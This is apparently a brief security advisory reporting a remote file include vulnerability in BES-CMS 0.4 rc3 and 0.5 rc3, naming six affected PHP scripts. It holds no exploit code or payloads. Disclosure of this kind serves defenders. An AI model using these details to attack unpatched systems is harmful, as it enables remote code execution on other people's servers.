It has been reported that BES-CMS is vulnerable to a remote file include vulnerability that may allow an attacker to include malicious files containing arbitrary code to be executed on a vulnerable system. The problem exists in the 'index.inc.php', 'Members/index.inc.php', 'Members/root/index.inc.php', 'Include/functions_folder.php', 'Include/functions_message.php', 'Include/Start.php' scripts of the software.

BES-CMS versions 0.4 rc3 and 0.5 rc3 are reported to be vulnerable to this issue, however other versions may be affected as well.
